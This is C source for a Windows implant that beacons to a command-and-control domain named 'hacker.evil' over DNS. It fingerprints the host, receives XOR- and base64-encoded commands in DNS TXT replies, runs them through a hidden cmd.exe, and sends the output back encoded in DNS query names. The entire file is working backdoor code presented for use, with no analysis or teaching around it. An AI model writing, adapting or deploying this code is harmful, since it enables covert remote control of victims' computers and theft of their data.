// agent_dns.c
// compile: x86_64-w64-mingw32-gcc -O2 -Wall -o agent_dns.exe agent_dns.c -lws2_32 -lwininet -lpsapi

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define XOR_KEY "mysecretkey"
#define XOR_KEYLEN (sizeof(XOR_KEY) - 1)
#define DNS_SERVER "127.0.0.1"
#define DNS_PORT 5300
#define C2_DOMAIN "hacker.evil"





static void xor_data(char* data, size_t len, const char* key, size_t klen) { for (size_t i = 0; i < len; ++i) data[i] ^= key[i % klen]; }
static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static void base64_encode(const unsigned char* input, size_t in_len, char* out, size_t out_size) {
    size_t olen = 0; int val = 0, valb = -6;
    for (size_t i = 0; i < in_len; i++) {
        val = (val << 8) + input[i]; valb += 8;
        while (valb >= 0) { if (olen + 1 < out_size) out[olen++] = b64_chars[(val >> valb) & 0x3F]; valb -= 6; }
    }
    if (valb > -6 && olen + 1 < out_size) out[olen++] = b64_chars[((val << 8) >> (valb + 8)) & 0x3F];
    while (olen % 4 && olen + 1 < out_size) out[olen++] = '=';
    if (olen < out_size) out[olen] = 0;
}

static int b64_reverse_table[256] = {0};
static void build_b64_reverse_table() {
    static int built = 0; if (built) return;
    memset(b64_reverse_table, -1, sizeof(b64_reverse_table));
    for (int i = 0; i < 64; i++) b64_reverse_table[(unsigned char)b64_chars[i]] = i;
    built = 1;
}
static int base64_decode(const char* in, unsigned char* out, size_t out_size) {
    build_b64_reverse_table(); int len = strlen(in), outl = 0, val = 0, valb = -8;
    for (int i = 0; i < len; i++) {
        int tbl = b64_reverse_table[(unsigned char)in[i]]; if (tbl == -1) break;
        val = (val << 6) + tbl; valb += 6;
        if (valb >= 0) { if (outl < (int)out_size) out[outl++] = (unsigned char)((val >> valb) & 0xFF); valb -= 8; }
    }
    return outl;
}

/* Infos agent */
void get_hostname(char* out, DWORD len) {
    if (!GetComputerNameA(out, &len)) strcpy(out, "unknown_host");
}
void get_username(char* out, DWORD len) {
    if (!GetUserNameA(out, &len)) strcpy(out, "unknown_user");
}
void get_process_name(char* out, DWORD len) {
    if (GetModuleFileNameA(NULL, out, len)) {
        char* p = strrchr(out, '\\');
        if (p) memmove(out, p + 1, strlen(p));
    }
    else strcpy(out, "unknown_process");
}

void generate_agent_id(char* out, size_t outlen) {
    char host[128] = "", user[128] = "", proc[128] = "";
    DWORD sz = 128;
    get_hostname(host, sz);
    sz = 128;
    get_username(user, sz);
    sz = 128;
    get_process_name(proc, sz);
    snprintf(out, outlen, "%s_%s_%s", host, user, proc);
}

/* Command exécution Windows: pipe stdout vers buffer (safe) */
size_t exec_cmd(const char* cmd, char* buf, size_t bufsize) {
    HANDLE readPipe, writePipe;
    SECURITY_ATTRIBUTES sa = {.nLength=sizeof(sa), .bInheritHandle=TRUE,.lpSecurityDescriptor=NULL};
    if (!CreatePipe(&readPipe, &writePipe, &sa, 0)) return 0;
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES; 
    si.hStdOutput = writePipe; si.hStdError = writePipe; si.hStdInput = NULL;
    char cmdline[512]; snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    BOOL res = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!res) { CloseHandle(readPipe); CloseHandle(writePipe); return 0; }
    CloseHandle(writePipe);
    DWORD outlen = 0, bytesRead = 0;
    while (ReadFile(readPipe, buf + outlen, (DWORD)(bufsize-1-outlen), &bytesRead, NULL) && bytesRead) {
        outlen += bytesRead; if (outlen > bufsize-2) break;
    }
    buf[outlen] = 0;
    CloseHandle(readPipe); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return outlen;
}

/* DNS code */
#pragma pack(push, 1)
typedef struct {    // Header DNS RFC1035
    unsigned short id;
    unsigned short flags;
    unsigned short qcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
} DNS_HEADER;
typedef struct {
    // QNAME encoded (labels: [len][bytes]), then
    unsigned short qtype;
    unsigned short qclass;
} QUESTION;
#pragma pack(pop)

void encode_qname(const char* hostname, unsigned char* dest) {
    const char* beg = hostname, * dot = strchr(beg,'.'); int i = 0;
    while (dot) {
        int len = dot - beg;
        *dest++ = len;
        memcpy(dest, beg, len);
        dest += len;
        beg = dot + 1;
        dot = strchr(beg, '.');
    }
    int len = strlen(beg);
    *dest++ = len; memcpy(dest, beg, len); dest += len; *dest++ = 0;
}

/* Minimal DNS TXT query : résultats TXT dans txt_out */
int dns_txt_query(const char* qname, char* txt_out, size_t out_len) {
    WSADATA wsa; SOCKET sock = 0; struct sockaddr_in addr;
    if (WSAStartup(MAKEWORD(2,2),&wsa)!=0) return 0;
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return 0;
    addr.sin_family = AF_INET; addr.sin_port = htons(DNS_PORT); addr.sin_addr.s_addr = inet_addr(DNS_SERVER);
    unsigned char buf[512] = {0}; DNS_HEADER* dns = (DNS_HEADER*)buf;
    dns->id = htons(rand() % 65536); dns->flags = htons(0x0100); dns->qcount = htons(1);
    unsigned char* qn = (unsigned char*)&buf[sizeof(DNS_HEADER)];
    encode_qname(qname, qn);
    QUESTION* q = (QUESTION*)(qn + strlen((char*)qn) + 1); q->qtype = htons(16); q->qclass = htons(1); //(TXT/IN)
    int pkt_len = (char*)q + sizeof(QUESTION) - (char*)buf;
    sendto(sock, buf, pkt_len, 0, (struct sockaddr*)&addr, sizeof(addr));
    int recvlen = recv(sock, (char*)buf, sizeof(buf), 0);
    closesocket(sock); WSACleanup();
    for(int z=0; z<recvlen; z++){ printf("%02X ", (unsigned char)buf[z]); if((z+1)%16==0) printf("\n"); }
    if (recvlen < 0) return 0;
    int i = sizeof(DNS_HEADER);
    while(i < recvlen && buf[i] != 0) i++;
    i += 5; // \0, QTYPE(2), QCLASS(2)
    while(i+11 < recvlen) {
        if (buf[i+2] == 0x00 && buf[i+3] == 0x10) {
            int txt_rdlength = (buf[i+10] << 8) | buf[i+11];
            int txt_len = buf[i+12];
            if (txt_len > 0 && txt_len < out_len && i+13+txt_len <= recvlen) {
                memcpy(txt_out, &buf[i+13], txt_len);
                txt_out[txt_len] = 0;
                return txt_len;
            }
        }
        i++;
    }
    return 0;
}

void agent_beacon() {
    char agent_id[128]; generate_agent_id(agent_id, sizeof(agent_id));
    while (1) {
        char beacon_q[512];
        char id_b64[256] = { 0 };
        base64_encode((unsigned char*)agent_id, strlen(agent_id), id_b64, sizeof(id_b64));
        snprintf(beacon_q, sizeof(beacon_q), "beacon.%s.%s", id_b64, C2_DOMAIN);
        char taskdata[512]={0};
        int ok = dns_txt_query(beacon_q, taskdata, sizeof(taskdata));
        if (ok && strlen(taskdata) > 2) {
            unsigned char b64data[512] = {0};
            int len = base64_decode(taskdata, b64data, sizeof(b64data));
            xor_data((char*)b64data, len, XOR_KEY, XOR_KEYLEN);
            char cmd_out[1024] = {0};
            size_t outlen = 0;
            if (b64data[0]) {
                outlen = exec_cmd((char*)b64data, cmd_out, sizeof(cmd_out) - 1);
                xor_data(cmd_out, outlen, XOR_KEY, XOR_KEYLEN);
                char out_b64[2048] = {0};
                base64_encode((unsigned char*)cmd_out, outlen, out_b64, sizeof(out_b64));
                char result_q[700] = {0};
                snprintf(result_q, sizeof(result_q), "result.%s.%s.%s", id_b64, out_b64, C2_DOMAIN);
                char dummy[32]; dns_txt_query(result_q, dummy, sizeof(dummy)); // Push, no result expected
            }
        }
        Sleep(5000);
    }
}

int main() {
    agent_beacon();
    return 0;
}
